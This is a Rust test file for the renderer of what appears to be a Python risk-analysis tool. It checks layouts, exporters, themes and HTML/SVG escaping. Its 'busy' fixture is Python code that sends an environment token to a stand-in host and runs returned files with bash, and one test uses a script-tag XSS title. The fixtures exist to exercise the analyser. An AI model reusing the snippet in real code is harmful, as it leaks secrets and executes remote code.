//! The renderer's contract: it draws something sensible for every combination
//! of theme, layout and width, and it never panics or spills outside the
//! buffer it was given. Panels clip; that is the whole point of `canvas`.

use pyxray_core::xray;
use pyxray_render::export::{self, Format};
use pyxray_render::layout::{self, Layout};
use pyxray_render::panels::{Icons, Opts};
use pyxray_render::theme::THEMES;

const SAMPLES: &[(&str, &str)] = &[
    ("empty", ""),
    ("tiny", "print(1)\n"),
    (
        "broken",
        "def f(:\n    x = [1,\n",
    ),
    (
        "wide",
        "x = \"\u{65e5}\u{672c}\u{8a9e}\u{306e}\u{30c6}\u{30ad}\u{30b9}\u{30c8}\"\nprint(f\"\u{2192} {x}\")\n",
    ),
    (
        "busy",
        "import os, subprocess, shutil, requests\n\
         TOKEN = os.environ[\"T\"]\n\
         shutil.rmtree(\"/tmp/x\")\n\
         r = requests.post(\"https://h/\", json={\"t\": TOKEN})\n\
         for name in r.json():\n\
         \x20   with open(name, \"w\") as fh:\n\
         \x20       fh.write(name)\n\
         \x20   subprocess.run(f\"bash {name}\", shell=True)\n",
    ),
];

#[test]
fn every_combination_stays_inside_its_buffer() {
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for theme in THEMES {
            for l in Layout::all() {
                for width in [24u16, 32, 60, 100, 180] {
                    let buf = layout::render(&report, theme, &Opts::default(), l, width, None);
                    assert_eq!(
                        buf.area.width,
                        width.max(24),
                        "{label}/{}/{}/{width}: buffer width changed",
                        theme.id,
                        l.id()
                    );
                    assert!(
                        buf.area.height >= 1,
                        "{label}/{}/{}/{width}: empty buffer",
                        theme.id,
                        l.id()
                    );
                }
            }
        }
    }
}

#[test]
fn plain_text_never_exceeds_the_requested_width() {
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for theme in THEMES {
            for l in Layout::all() {
                for width in [32u16, 78, 120] {
                    let buf = layout::render(&report, theme, &Opts::default(), l, width, None);
                    let text = export::to_text(&buf);
                    for (i, line) in text.lines().enumerate() {
                        let w = unicode_width::UnicodeWidthStr::width(line);
                        assert!(
                            w <= width as usize,
                            "{label}/{}/{}/{width}: line {i} is {w} wide:\n{line}",
                            theme.id,
                            l.id()
                        );
                    }
                }
            }
        }
    }
}

#[test]
fn a_fixed_height_is_honoured_exactly() {
    let report = xray(SAMPLES[4].1, "busy");
    for l in Layout::all() {
        for height in [6u16, 12, 40] {
            let buf = layout::render(&report, &THEMES[0], &Opts::default(), l, 100, Some(height));
            assert_eq!(buf.area.height, height, "{}/{height}", l.id());
        }
    }
}

#[test]
fn every_exporter_produces_output() {
    let report = xray(SAMPLES[4].1, "busy");
    for theme in THEMES {
        let buf = layout::render(&report, theme, &Opts::default(), Layout::Card, 90, None);
        for format in [Format::Ansi, Format::Text, Format::Html, Format::Svg] {
            let out = export::emit(&buf, theme, format, "busy");
            assert!(!out.trim().is_empty(), "{}/{format:?} was empty", theme.id);
        }
        let html = export::to_html_fragment(&buf, theme);
        assert_eq!(
            html.matches("<span").count(),
            html.matches("</span>").count(),
            "{}: unbalanced spans",
            theme.id
        );
        let svg = export::to_svg(&buf, theme, "busy");
        assert!(svg.starts_with("<svg"), "{}: not an svg", theme.id);
        assert!(svg.ends_with("</svg>\n"), "{}: truncated svg", theme.id);
    }
}

#[test]
fn icon_modes_all_render() {
    let report = xray(SAMPLES[4].1, "busy");
    for icons in [Icons::Glyph, Icons::Tag, Icons::Both] {
        let opts = Opts {
            icons,
            ..Opts::default()
        };
        let buf = layout::render(&report, &THEMES[0], &opts, Layout::Card, 100, None);
        let text = export::to_text(&buf);
        assert!(
            text.contains("delete") || text.contains(THEMES[0].gl.cross),
            "{icons:?}:\n{text}"
        );
    }
}

#[test]
fn folding_the_outline_reports_what_it_hid() {
    let report = xray(SAMPLES[4].1, "busy");
    let opts = Opts {
        max_depth: 1,
        ..Opts::default()
    };
    let buf = layout::render(&report, &THEMES[0], &opts, Layout::Flow, 100, None);
    let text = export::to_text(&buf);
    assert!(text.contains("hidden"), "no fold marker:\n{text}");
}

#[test]
fn the_mono_theme_is_pure_ascii() {
    let mono = pyxray_render::theme::theme("mono").unwrap();
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for l in Layout::gallery() {
            for width in [40u16, 80, 100, 160] {
                let buf = layout::render(&report, &mono, &Opts::default(), l, width, None);
                let text = export::to_text(&buf);
                // The user's own code may be anything; the *chrome* must be ASCII.
                if let Some(bad) = text.chars().find(|c| !c.is_ascii() && !source.contains(*c)) {
                    panic!(
                        "{label} {:?} @{width}: non-ASCII {bad:?} (U+{:04X}) in\n{text}",
                        l.id(),
                        bad as u32
                    );
                }
                // And the ANSI form carries no colour at all — the theme has
                // none — only a reset, and bold where weight does the work.
                let ansi = export::to_ansi(&buf, &mono);
                assert!(
                    !ansi.contains("38;"),
                    "{label} {:?}: colour in mono",
                    l.id()
                );
            }
        }
    }
}

#[test]
fn the_ansi_theme_never_emits_truecolor() {
    let ansi_theme = pyxray_render::theme::theme("ansi").unwrap();
    let report = xray(SAMPLES[4].1, "busy");
    for l in Layout::gallery() {
        let buf = layout::render(&report, &ansi_theme, &Opts::default(), l, 100, None);
        let out = export::to_ansi(&buf, &ansi_theme);
        assert!(
            !out.contains("38;2;") && !out.contains("48;2;"),
            "{:?}:\n{out}",
            l.id()
        );
        assert!(
            out.contains("\x1b[0;3") || out.contains("\x1b[0;9"),
            "{:?}",
            l.id()
        );
    }
}

#[test]
fn html_and_svg_titles_are_escaped() {
    let report = xray("print(1)\n", "a<script>alert(1)</script>.py");
    let buf = layout::render(
        &report,
        &THEMES[0],
        &Opts::default(),
        Layout::Card,
        80,
        None,
    );
    let html = export::to_html(&buf, &THEMES[0], &report.meta.name);
    let svg = export::to_svg(&buf, &THEMES[0], &report.meta.name);
    assert!(!html.contains("<script>"), "{html}");
    assert!(!svg.contains("<script>"), "{svg}");
    assert!(html.contains("&lt;script&gt;"));
}

#[test]
fn the_header_word_agrees_with_the_band_beside_it() {
    // Three notable writes score 30 — the old score-only header said "check
    // it" in amber while the band block beside it said routine in green.
    let src = "open('a', 'w')\nopen('b', 'w')\nopen('c', 'w')\n";
    let report = xray(src, "t");
    assert_eq!(
        report.band(),
        pyxray_core::model::Band::Routine,
        "risk {}",
        report.metrics.risk
    );
    let buf = layout::render(
        &report,
        &THEMES[0],
        &Opts::default(),
        Layout::Card,
        100,
        None,
    );
    let text = export::to_text(&buf);
    assert!(text.contains("routine"), "{text}");
    assert!(!text.contains("check it"), "{text}");
    // And one rmtree at a low score is "check it", not "routine".
    let report = xray("import shutil\nshutil.rmtree('/x')\n", "t");
    let buf = layout::render(
        &report,
        &THEMES[0],
        &Opts::default(),
        Layout::Card,
        100,
        None,
    );
    let text = export::to_text(&buf);
    assert!(text.contains("check it"), "{text}");
}

#[test]
fn a_syntax_error_is_reported_once() {
    let report = xray("def f(:\n    pass\n", "broken");
    let buf = layout::render(
        &report,
        &THEMES[0],
        &Opts::default(),
        Layout::Dashboard,
        100,
        None,
    );
    let text = export::to_text(&buf);
    assert!(text.to_lowercase().contains("expected"), "{text}");
    assert!(text.matches("analysis is partial").count() <= 1, "{text}");
}

/// The screen exporter is what the interactive views paint through, and a raw
/// terminal is unforgiving about how a frame gets from one row to the next.
/// Raw mode clears `ONLCR`, so a newline is a bare line feed that keeps the
/// column: a frame joined by newlines staircases off the right edge, and the
/// one after the bottom row scrolls the screen. `pyx watch` showed exactly
/// that — an honest count in the status bar over a blank body.
#[test]
fn the_screen_exporter_positions_rows_instead_of_using_newlines() {
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for theme in THEMES {
            let opts = Opts {
                icons: Icons::Both,
                ..Opts::default()
            };
            let buf = layout::render(&report, theme, &opts, Layout::Auto, 80, Some(24));
            let frame = export::to_ansi_screen(&buf, theme, 1);
            assert!(
                !frame.contains('\n'),
                "{label}/{}: frame carries a newline",
                theme.id
            );
            assert!(
                !frame.contains('\r'),
                "{label}/{}: frame carries a carriage return",
                theme.id
            );
            // Every row says where it goes, and the first one goes home.
            assert!(frame.starts_with("\x1b[1;1H"), "{label}/{}", theme.id);
            for y in 0..buf.area.height {
                let at = format!("\x1b[{};1H", y + 1);
                assert!(frame.contains(&at), "{label}/{}: missing {at:?}", theme.id);
            }
        }
    }
}

/// The plain exporter still ends every line, because a file and a pipe want
/// exactly what the screen exporter must not emit.
#[test]
fn the_plain_ansi_exporter_still_writes_lines() {
    let report = xray("print(1)\n", "tiny");
    let theme = &THEMES[0];
    let buf = layout::render(&report, theme, &Opts::default(), Layout::Line, 80, Some(6));
    let text = export::to_ansi(&buf, theme);
    assert_eq!(text.matches('\n').count(), buf.area.height as usize);
    assert!(!text.contains("\x1b[1;1H"));
}
